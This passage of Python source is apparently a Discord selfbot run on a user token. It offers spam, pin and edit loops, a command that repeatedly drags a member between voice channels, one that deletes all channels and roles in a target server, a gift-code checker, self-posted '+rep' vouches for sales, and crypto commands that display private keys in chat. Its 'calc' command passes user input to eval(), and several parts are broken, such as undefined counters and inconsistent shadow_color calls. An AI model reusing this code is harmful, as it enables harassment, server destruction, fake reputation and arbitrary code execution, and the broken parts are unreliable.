    await send_embed(ctx, embed)

@bot.command()
async def stickbug(ctx, user: discord.User):
    embed = discord.Embed(
        title="Stickbugged!",
        description=f"{user.mention} has been stickbugged! 🕺 [Link to Stickbug](https://www.youtube.com/watch?v=hZfYw0MAYfI)",
        color=shadow_color()
    )
    await send_embed(ctx, embed)

@bot.command()
async def tweet(ctx, user: discord.User, *, message: str):
    embed = discord.Embed(
        title="Tweet",
        description=f"{user.name} tweets: {message}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def blurpify(ctx, user: discord.User):
    embed = discord.Embed(
        title="Blurpified!",
        description=f"{user.mention} has been blurpified! 🗯️",
        color=shadow_color()
    )
    await send_embed(ctx, embed)


@bot.command()
async def deepfry(ctx, user: discord.User):
    embed = discord.Embed(
        title="Deep Fried!",
        description=f"{user.mention}'s picture has been deep fried! 🔥 (This is a placeholder response)",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def captcha(ctx, user: discord.User):
    embed = discord.Embed(
        title="Captcha",
        description=f"{user.mention}, please complete the captcha! 🔒 [Link to Captcha](https://example.com/captcha)",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def threat(ctx, user: discord.User):
    embed = discord.Embed(
        title="Threat",
        description=f"{user.mention} has issued a threat! ⚠️",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def iphone(ctx, user: discord.User):
    embed = discord.Embed(
        title="New iPhone",
        description=f"{user.mention} just got a new iPhone! 📱",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def ship(ctx, user: discord.User):
    ships = ["❤️", "💔", "💞", "💓", "💖"]
    embed = discord.Embed(
        title="Shipped!",
        description=f"{user.mention}, you are now officially shipped! {random.choice(ships)}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def encrypt(ctx, *, message: str):
    encoded_message = base64.b64encode(message.encode()).decode()
    embed = discord.Embed(
        title="Encrypted Message",
        description=f"Encrypted message: `{encoded_message}`",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def decrypt(ctx, *, message: str):
    try:
        decoded_message = base64.b64decode(message.encode()).decode()
        embed = discord.Embed(
            title="Decrypted Message",
            description=f"Decrypted message: `{decoded_message}`",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except Exception:
        embed = discord.Embed(
            title="Decryption Failed",
            description="Failed to decrypt the message. Please ensure it is valid Base64.",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command()
async def tokenhalf(ctx, user: discord.User):
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    half_token = token[:len(token)//2]  
    embed = discord.Embed(
        title="Half Token",
        description=f"Half of {user.name}'s token: `{half_token}`",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def vcspam(ctx, vc_id_one: int, vc_id_two: int, user_id: int, amount: int):
    try:
        channel_one = bot.get_channel(vc_id_one)
        channel_two = bot.get_channel(vc_id_two)
        if isinstance(channel_one, discord.VoiceChannel) and isinstance(channel_two, discord.VoiceChannel):
            user = ctx.guild.get_member(user_id)
            if user:
                for _ in range(amount):
                    await user.move_to(channel_one)
                    await user.move_to(channel_two)
                embed = discord.Embed(
                    title="VC Spam",
                    description=f"Spammed {user.name} between {channel_one.name} and {channel_two.name}!",
                    color=shadow_color
                )
                await send_embed(ctx, embed)
            else:
                embed = discord.Embed(
                    title="Error",
                    description="User not found.",
                    color=shadow_color
                )
                await send_embed(ctx, embed)
        else:
            embed = discord.Embed(
                title="Error",
                description="One of the provided IDs does not correspond to a voice channel.",
                color=shadow_color
            )
            await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {e}",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command()
async def spampin(ctx, amount: int):
    for _ in range(amount):
        message = await ctx.send("This is a pinned message!")
        await message.pin()
        await asyncio.sleep(1)  

@bot.command()
async def spamedit(ctx, amount: int, *, new_message: str):
    message = await ctx.send("This message will be edited.")
    for _ in range(amount):
        await message.edit(content=new_message)
        await asyncio.sleep(1)  

@bot.command()
async def spam(ctx, amount: int, *, message: str):
    for _ in range(amount):
        await ctx.send(message)
        await asyncio.sleep(1) 

@bot.command()
async def qr(ctx, *, message: str):
    qr_img = qrcode.make(message)
    with io.BytesIO() as buf:
        qr_img.save(buf, 'PNG')
        buf.seek(0)
        await ctx.send(file=discord.File(buf, 'qr_code.png'))


@bot.command(aliases=["tableflip","flip"])
async def fliptable(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┻━┻")

@bot.command(aliases=["untableflip","tableunflip","unfliptable"])
async def unflip(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┳━┳")

@bot.command(aliases=["tw"])
async def spoiler(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"||{message}||")

@bot.command(aliases=["ul","line"])
async def underline(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"__{message}__")

@bot.command()
async def bold(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"**{message}**")

@bot.command()
async def italic(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"_{message}_")

@bot.command()
async def block(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```\n{message}```")

@bot.command(aliases=["redblock"])
async def redtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n- {message}```")

@bot.command(aliases=["orangeblock"])
async def orangetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n[{message}]```")

@bot.command(aliases=["yellowblock"])
async def yellowtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```fix\n{message}```")

@bot.command(aliases=["greenblock"])
async def greentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n+{message}```")

@bot.command(aliases=["lightgreenblock"])
async def lightgreentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n\"{message}\"```")

@bot.command(aliases=["cyanblock"])
async def cyantext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```json\n\"{message}\"```")  

@bot.command(aliases=["blueblock"])
async def bluetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```ini\n[{message}]```")

@bot.command(aliases=['haste', 'paste'])
async def hastebin(ctx, *, paste: str = "Format is !hastebin [text]"):
    try:
        data = requests.post("https://hastebin.com/documents", timeout=3, data=paste).text
        textlink = "https://hastebin.com/"
    except requests.RequestException: 
        await ctx.send("_Hastebin is having problems - switching to Python Discord Paste._")
        await asyncio.sleep(1)
        data = requests.post("https://paste.pythondiscord.com/documents", data=paste).text
        textlink = "https://paste.pythondiscord.com/"
    j = json.loads(data)
    endoflink = j['key']
    response_message = f"Here's your paste!\n{textlink}{endoflink}"
    await ctx.send(response_message)

############################################
#              Vouch Commands              #
############################################

@bot.command()
async def vouch(ctx, user: discord.User, amount: str, *, infosex: str):
    currency = amount[-1]
    if currency not in ('$','€'):
        embed = discord.Embed(
            title="**Error**",
            description="Please provide a valid amount with a currency symbol ($ or €).",
            color=shadow_color
        )
        embed.add_field(name="Correct Format", value=f"`{bot.command_prefix}vouch @user <amount> <product>`", inline=False)
        await send_embed(ctx, embed)
        return
    
    try:
        float_amount = float(amount[:-1])
    except ValueError:
        embed = discord.Embed(
            title="**Error**",
            description="Please provide a valid amount (numeric value).",
            color=shadow_color
        )
        embed.add_field(name="Correct Format", value=f"`{bot.command_prefix}vouch @user <amount> <product>`", inline=False)
        await send_embed(ctx, embed)
        return

    if float_amount > 9999:
        embed = discord.Embed(
            title="**Error**",
            description="The maximum amount allowed is 9999.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return
    
    embed = discord.Embed(
        title="Deal Confirmed!",
        description=f"Amount: `{amount}`. Thank you, {user.name}!",
        color=shadow_color
    )
    await send_embed(ctx, embed)

    sax = await ctx.send(f"+rep {ctx.author.id} Legit got {infosex} for [{amount}]")
    
    embed_sax = discord.Embed(
        title="Please Vouch Me!",
        description=f"> **Please Vouch me in Server Below**\n> No Vouch = No Warranty of Product\n> Ty For buying\n\n{SERVER_Link}",
        color=shadow_color
    )
    await send_embed(ctx, embed_sax)

############################################
#             Crypto Commands              #
############################################

def fetch_balance(crypto, address):
    if crypto.lower() == 'btc':
        url = f'https://api.blockchain.info/q/addressbalance/{address}'
        response = requests.get(url)
        if response.status_code == 200:
            return response.json() / 1e8
    elif crypto.lower() == 'eth':
        url = f'https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey=YOUR_ETHERSCAN_API_KEY'
        response = requests.get(url)
        if response.status_code == 200:
            return int(response.json()['result']) / 1e18  
    elif crypto.lower() == 'ltc':
        url = f'https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance'
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()['final_balance'] / 1e8  
    elif crypto.lower() == 'usdt':
        url = f'https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=YOUR_USDT_CONTRACT_ADDRESS&address={address}&tag=latest&apikey=YOUR_ETHERSCAN_API_KEY'
        response = requests.get(url)
        if response.status_code == 200:
            return int(response.json()['result']) / 1e6 
    return None 

def fetch_conversion_rates():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=inr')
        data = response.json()
        ltc_price_inr = data['litecoin']['inr']

        conversion_rates = {
            'LTC': ltc_price_inr,
        }
        return conversion_rates
    except Exception as e:
        print(f"Error fetching conversion rates: {e}")
        return None
    
@bot.command()
async def calc(ctx, *, expression: str):
    try:
        result = eval(expression)
        embed = discord.Embed(
            title="Calculation Result",
            description=f"The result of `{expression}` is: {result}",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command()
async def price(ctx):
    rates = fetch_conversion_rates()
    if rates:
        price = rates['LTC']
        embed = discord.Embed(
            title="Litecoin Price",
            description=f"The current price of Litecoin (LTC) is ₹{price}.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to fetch conversion rates.",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command(name='i2c')
async def i2c(ctx, amount: float):
    rates = fetch_conversion_rates()
    if rates:
        ltc_amount = amount / rates['LTC']
        embed = discord.Embed(
            title="Currency Conversion",
            description=f"₹{amount} is equivalent to {ltc_amount:.6f} LTC.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to fetch conversion rates.",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command(name='c2i')
async def c2i(ctx, amount: float):
    rates = fetch_conversion_rates()
    if rates:
        ltc_value_inr = amount * rates['LTC']
        embed = discord.Embed(
            title="Currency Conversion",
            description=f"{amount} LTC is worth ₹{ltc_value_inr}.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to fetch conversion rates.",
            color=shadow_color
        )
        await send_embed(ctx, embed)

############################################
#              Guild Commands              #
############################################

@bot.command()
async def cchannels(ctx, old_server_id: int, new_server_id: int):
    old_server = bot.get_guild(old_server_id)
    new_server = bot.get_guild(new_server_id)
    if not old_server:
        embed = discord.Embed(
            title="Error",
            description="Old server not found.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return
    if not new_server:
        embed = discord.Embed(
            title="Error",
            description="New server not found.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return

    category_map = {}
    clone_messages = []
    for old_category in old_server.categories:
        new_category = await new_server.create_category_channel(name=old_category.name, overwrites=old_category.overwrites)
        category_map[old_category.id] = new_category
        for old_text_channel in old_category.text_channels:
            new_text_channel = await new_category.create_text_channel(name=old_text_channel.name, overwrites=old_text_channel.overwrites)
            clone_messages.append(f'Text channel cloned: {old_text_channel.name} -> {new_text_channel.name} in category: {old_category.name} -> {new_category.name}')
        for old_voice_channel in old_category.voice_channels:
            new_voice_channel = await new_category.create_voice_channel(name=old_voice_channel.name, overwrites=old_voice_channel.overwrites)
            clone_messages.append(f'Voice channel cloned: {old_voice_channel.name} -> {new_voice_channel.name} in category: {old_category.name} -> {new_category.name}')

    for old_channel in old_server.channels:
        if isinstance(old_channel, (discord.TextChannel, discord.VoiceChannel)) and old_channel.category is None:
            if isinstance(old_channel, discord.TextChannel):
                new_channel = await new_server.create_text_channel(name=old_channel.name, overwrites=old_channel.overwrites)
                clone_messages.append(f'Text channel cloned: {old_channel.name} (No Category) -> {new_channel.name}')
            elif isinstance(old_channel, discord.VoiceChannel):
                new_channel = await new_server.create_voice_channel(name=old_channel.name, overwrites=old_channel.overwrites)
                clone_messages.append(f'Voice channel cloned: {old_channel.name} (No Category) -> {new_channel.name}')

    embed = discord.Embed(
        title="Channel Cloning",
        description="Channels cloned successfully!",
        color=shadow_color
    )
    embed.add_field(name="Details", value="\n".join(clone_messages), inline=False)
    await send_embed(ctx, embed)

@bot.command()
async def croles(ctx, old_server_id: int, new_server_id: int):
    old_server = bot.get_guild(old_server_id)
    new_server = bot.get_guild(new_server_id)
    if old_server is None:
        embed = discord.Embed(
            title="Error",
            description="The old server does not exist.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return
    if new_server is None:
        embed = discord.Embed(
            title="Error",
            description="The new server does not exist.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return

    old_roles = old_server.roles
    role_map = {}
    clone_messages = []
    for role in reversed(old_roles):
        new_role = await new_server.create_role(name=role.name, color=role.color, hoist=role.hoist,
                                               mentionable=role.mentionable, permissions=role.permissions,
                                               reason="Cloning roles")
        role_map[role.id] = new_role
        clone_messages.append(f'Role cloned: {role.name} -> {new_role.name}')
        print(f'Role cloned: {role.name} -> {new_role.name}')

    for member in old_server.members:
        member_roles = member.roles
        new_member = new_server.get_member(member.id)
        if new_member is not None:
            for role in reversed(member_roles):
                if role.id in role_map:
                    new_role = role_map[role.id]
                    await new_member.add_roles(new_role)

    embed = discord.Embed(
        title="Role Cloning",
        description="Roles have been cloned successfully!",
        color=shadow_color
    )
    embed.add_field(name="Details", value="\n".join(clone_messages), inline=False)
    await send_embed(ctx, embed)

@bot.command()
async def cserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)
    if not source_guild or not target_guild:
        embed = discord.Embed(
            title="Error",
            description="Guild not found.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return

    for channel in target_guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{e}")
    
    for role in target_guild.roles:
        if role.name not in ["here", "@everyone"]:
            try:
                await role.delete()
                await asyncio.sleep(0)
            except Exception as e:
                print(f"{e}")

    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        try:
            new_role = await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            await asyncio.sleep(0)
            for perm, value in role.permissions:
                await new_role.edit_permissions(target_guild.default_role, **{perm: value})
        except Exception as e:
            print(f"{e}")

    embed = discord.Embed(
        title="Server Cloning",
        description="Server cloning process completed successfully.",
        color=shadow_color
    )
    await send_embed(ctx, embed)

############################################
#            Checker Commands              #
############################################
auth = {"Authorization": tknc}
r = requests.get("https://ptb.discord.com/api/v10/users/@me", headers=auth)
if r.status_code in [201, 204, 200]:
  pass
else:
  print("Invalid Token")
  sys.exit()

def save(file, data):
  with open(file, "a+") as f:
    f.write(data + "\n")

claimed_links = set()
valid_links = set()

async def check(promocode):
    async with aiohttp.ClientSession(headers=auth) as cs:
        async with cs.get(f"https://ptb.discord.com/api/v10/entitlements/gift-codes/{promocode}") as rs:
            if rs.status in [200, 204, 201]:
                data = await rs.json()
                if data["uses"] == data["max_uses"]:
                    claimed_count += 1
                else:
                    now = datetime.datetime.utcnow()
                    exp_at = data.get("expires_at", "N/A").split(".")[0]
                    try:
                        parsed = parser.parse(exp_at)
                        days = abs((now - parsed).days)
                    except Exception:
                        days = "Failed To Parse!"
                    title = data.get("promotion", {}).get("inbound_header_text", "N/A")
                    valid_count += 1
            elif rs.status == 429:
                try:
                    deta = await rs.json()
                    timetosleep = deta["retry_after"]
                    print(f"Rate Limited For {timetosleep} Seconds!")
                    await asyncio.sleep(timetosleep)
                    await check(promocode)
                except:
                    print("Error fetching rate limit data.")
            else:
                invalid_count += 1

@bot.command()
async def checkpromo(ctx, *promo_links):
    await ctx.message.delete()
    for promo_link in promo_links:
        promo_code = promo_link.split('/')[-1]  
        async with aiohttp.ClientSession(headers=auth) as cs:
            async with cs.get(f"https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}") as rs:
                if rs.status in [200, 204, 201]:
                    data = await rs.json()
                    if data["uses"] == data["max_uses"]:
                        embed = discord.Embed(
                            title="Promo Status: Claimed",
                            description=f"Promo Link: [Link]({promo_link})",
                            color=shadow_color
                        )
                        embed.add_field(name="Promo Type", value="N/A", inline=False)
                        embed.add_field(name="Expires in", value="N/A", inline=False)
                        await send_embed(ctx, embed)
                    else:
                        now = datetime.datetime.utcnow()
                        exp_at = data.get("expires_at", "N/A").split(".")[0]
                        try:
                            parsed = parser.parse(exp_at)
                            days = abs((now - parsed).days)
                        except Exception:
                            days = "Failed To Parse!"

                        title = data.get("promotion", {}).get("inbound_header_text", "N/A")
                        match = re.search(r'(\d )', title)
                        month = match.group(1) if match else "1"

                        embed = discord.Embed(
                            title="Promo Status: Valid",
                            description=f"Promo Link: [Link]({promo_link}) ||{promo_link}||",
                            color=shadow_color
                        )
                        embed.add_field(name="Promo Type", value=f"{month}m promo", inline=False)
                        embed.add_field(name="Expires in", value=f"{days} days", inline=False)
                        await send_embed(ctx, embed)
                elif rs.status == 429:
                    try:
                        deta = await rs.json()
                        timetosleep = deta["retry_after"]
                        print(f"Rate Limited For {timetosleep} Seconds!")
                        await asyncio.sleep(timetosleep)
                        await checkpromo(ctx, promo_link) 
                    except:
                        print("Error fetching rate limit data.")
                else:
                    embed = discord.Embed(
                        title="Promo Status: Invalid",
                        description=f"Promo Link: [Link]({promo_link})",
                        color=shadow_color
                    )
                    embed.add_field(name="Promo Type", value="N/A", inline=False)
                    embed.add_field(name="Expires in", value="N/A", inline=False)
                    await send_embed(ctx, embed)

############################################
#         LTC SENDER Commands              #
############################################

def load_wallets():
    if os.path.exists('wallet.json'):
        with open('wallet.json') as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
    return []  

def save_wallets(wallets):
    with open('wallet.json', 'w') as f:
        json.dump(wallets, f, indent=2)

def get_ltc_to_usd_rate():
    try:
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd")
        data = response.json()
        return data["litecoin"]["usd"]
    except requests.exceptions.RequestException:
        return 100  

def get_balance_info(address):
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance?token={api_token}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException:
        return {"balance": 0}  

def create_ltc_address():
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs?token={api_token}"
    response = requests.post(url)
    if response.status_code == 201:
        data = response.json()
        return data["address"], data["private"], data["wif"]
    return None, None, None

@bot.command()
async def genwallet(ctx):
    public_address, private_key, wif = create_ltc_address()

    if public_address:
        embed = discord.Embed(
            title="🔑 **Litecoin Address** 🔑",
            description="Here is your new Litecoin address and private key.",
            color=shadow_color()
        )
        embed.add_field(name="**Public Address**", value=f"`{public_address}`", inline=False)
        embed.add_field(name="**Private Key**", value=f"`{private_key}`", inline=False)
        await send_embed(ctx, embed)
        wallet_data = {
            "public_address": public_address,
            "private_key": private_key,
            "wif": wif
        }

        wallets.append(wallet_data)
        save_wallets(wallets)
        confirmation_embed = discord.Embed(
            title="Wallet Created",
            description="Your Litecoin wallet has been created and saved successfully.",
            color=shadow_color
        )
        await send_embed(ctx, confirmation_embed)
    else:
        error_embed = discord.Embed(
            title="⚠️ Wallet Creation Failed",
            description="Failed to create a Litecoin address. Please try again later.",
            color=shadow_color
        )
        await send_embed(ctx, error_embed)

@bot.command()
async def wallets(ctx):
    if not wallets:
        await ctx.send("No wallets found.")
    else:
        wallet_list = "\n".join([wallet["wallet_name"] for wallet in wallets])
        embed = discord.Embed(
            title="**Wallet Names**",
            description=wallet_list if wallet_list else "No wallets available.",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command(aliases=["pay", "sendltc"])
async def send(ctx, addy, value):
    try:
        value = float(value.strip('$'))
        ltc_price_url = "https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd"
        transaction_url = "https://api.tatum.io/v3/litecoin/transaction"
        price_response = requests.get(ltc_price_url)
        price_response.raise_for_status()
        ltc_price = price_response.json()['litecoin']['usd']
        topay = value / ltc_price

        payload = {
            "fromAddress": [
                {
                    "address": ltc_addy,
                    "privateKey": ltc_priv_key
                }
            ],
            "to": [
                {
                    "address": addy,
                    "value": round(topay, 8)
                }
            ],
            "fee": "0.00005",
            "changeAddress": ltc_addy
        }

        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "x-api-key": api_key
        }

        response = requests.post(transaction_url, json=payload, headers=headers)
        response.raise_for_status()
        response_data = response.json()

        tx_id = response_data.get("txId", "Unknown")
        embed = discord.Embed(
            title="<:check:1305951941423009803> Transaction Successful",
            description=(
                f"<:Money:1305993434351538196> **Successfully Sent {value}$**\n"
                f"<:43565member:1306361082922799114> **From** {ltc_addy}\n"
                f"<:arrow_downright:1305955462700863498> **To** {addy}\n"
                f"🔗 **Transaction Id**: [Click here](https://live.blockcypher.com/ltc/tx/{tx_id})"
            )
        )
        await send_embed(ctx, embed)
    except requests.exceptions.RequestException as e:
        embed = discord.Embed(
            title="LTC Transaction Failed",
            description=f"**Failed to send LTC Because**: Network error occurred: {e}",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except KeyError:
        embed = discord.Embed(
            title="LTC Transaction Failed",
            description="**Failed to send LTC Because**: Unexpected API response.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(
            title="LTC Transaction Failed",
            description=f"**An error occurred**: {e}",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return
    
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    embed = discord.Embed(
        title="**Wallet Info**",
        description=f"**LTC Address:** `{ltcaddress}`",
        color=shadow_color
    )
    embed.add_field(name="Current Balance", value=f"${usd_balance:.2f}", inline=False)
    embed.add_field(name="Total LTC Received", value=f"${usd_total_balance:.2f}", inline=False)
    embed.add_field(name="Unconfirmed LTC", value=f"${usd_unconfirmed_balance:.2f}", inline=False)
    await send_embed(ctx, embed)

@bot.command()
async def mybal(ctx):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltc_addy}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return
    
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    embed = discord.Embed(
        title="**My Wallet Info**",
        description=f"**LTC Address:** `{ltc_addy}`",
        color=shadow_color
    )
    embed.add_field(name="Current Balance", value=f"${usd_balance:.2f}", inline=False)
    embed.add_field(name="Total LTC Received", value=f"${usd_total_balance:.2f}", inline=False)
    embed.add_field(name="Unconfirmed LTC", value=f"${usd_unconfirmed_balance:.2f}", inline=False)
    await send_embed(ctx, embed)


############################################
#            Selling Commands              #
############################################

def get_ltc_price():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
        response.raise_for_status()
        return response.json()['litecoin']['usd']
    except Exception as e:
        print(f"Error fetching LTC price: {e}")
        return None
    
def get_exchange_rate():
    url = "https://api.exchangerate-api.com/v4/latest/EUR"
    response = requests.get(url)
    data = response.json()
    return data["rates"]

@bot.command()
async def etu(ctx, amount: float):
    rates = get_exchange_rate()
    usd_amount = amount * rates['USD']
    
    # Embed for currency conversion (EUR to USD)
    embed = discord.Embed(
        title="Currency Conversion (EUR to USD)",
        description=f"{amount} EUR is equal to {usd_amount:.2f} USD",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def ute(ctx, amount: float):
    rates = get_exchange_rate()
    eur_amount = amount / rates['USD']
    
    # Embed for currency conversion (USD to EUR)
    embed = discord.Embed(
        title="Currency Conversion (USD to EUR)",
        description=f"{amount} USD is equal to {eur_amount:.2f} EUR",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command(aliases=['addy'])
async def recieve(ctx):
    embed = discord.Embed(
        title="Litecoin Address",
        description=f"Your Litecoin address is: `{ltc_addy}`",
        color=shadow_color()
    )
    await send_embed(ctx, embed)

@bot.command(aliases=['upiid'])
async def upi(ctx):
    embed = discord.Embed(
        title="UPI ID",
        description=f"Your UPI ID is: `{upi_addy}`",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def upiqr(ctx, amount: float):
    qr_data = f"upi://pay?pa={upi_addy}&pn=Airtel&am={amount}&cu=INR&tid=transactionid"
    qr = qrcode.make(qr_data)
    img_byte_arr = io.BytesIO()
    qr.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    embed = discord.Embed(
        title="UPI QR Code",
        description=f"UPI QR for: {amount}₹",
        color=shadow_color
    )
    await ctx.send(embed=embed, file=discord.File(img_byte_arr, filename='inr_qr.png'))

@bot.command()
async def ltcqr(ctx, amount: float):
    ltc_price = get_ltc_price()
    if ltc_price is None:
        await ctx.send("Unable to fetch LTC price. Please try again later.")
        return
    
    ltc_amount = amount / ltc_price
    qr_data = f"litecoin:{ltc_addy}?amount={ltc_amount:.6f}"
    qr = qrcode.make(qr_data)
    img_byte_arr = io.BytesIO()
    qr.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    embed = discord.Embed(
        title="Litecoin QR Code",
        description=f"LTC QR for: {amount}$",
        color=shadow_color()
    )
    await ctx.send(embed=embed, file=discord.File(img_byte_arr, filename='ltc_qr.png'))

############################################
#                Vc Commands               #
############################################

@bot.command(name='vc247', aliases=['247'], brief="24/7 a vc", usage=".vc247 [on/off] <vc.channel.id>")
async def vc247(ctx, status: str, channel_id: int = None):
    global vc
    await ctx.message.delete()
    embed = discord.Embed(color=shadow_color)
    
    if status.lower() == "on" and channel_id:
        save_voice_channel(ctx.guild.id, channel_id)
        channel = bot.get_channel(channel_id)
        if isinstance(channel, discord.VoiceChannel):
            vc[ctx.guild.id] = await channel.connect()
            embed.title = "Voice Channel 24/7 Mode"
            embed.description = f"Joined voice channel {channel.name} and will stay 24/7."
            await send_embed(ctx, embed)
        else:
            embed.title = "Invalid Channel"
            embed.description = "This is not a valid voice channel ID."
            await send_embed(ctx, embed)

    elif status.lower() == "off":
        if ctx.guild.id in vc:
            await vc[ctx.guild.id].disconnect()
            del vc[ctx.guild.id]
            embed.title = "Voice Channel 24/7 Mode Disabled"
            embed.description = "Disconnected from voice channel and disabled 24/7 mode."
            await send_embed(ctx, embed)
        else:
            embed.title = "Not Connected"
            embed.description = "Bot is not currently connected to a voice channel."
            await send_embed(ctx, embed)
    else:
        embed.title = "Invalid Command Usage"
        embed.description = "Use `.vc247 [on/off] <vc.channel.id>`."
        await send_embed(ctx, embed)


@bot.command(name='vckick', aliases=['vkick'], brief="Kicks vc user", usage=".vckick <mention.user>")
async def vckick(ctx, user: discord.Member):
    await ctx.message.delete()
    embed = discord.Embed(color=shadow_color)
    if user.voice and user.voice.channel:
        await user.move_to(None)
        embed.title = "User Kicked"
        embed.description = f"{user.mention} has been kicked from the voice channel."
        await send_embed(ctx, embed)


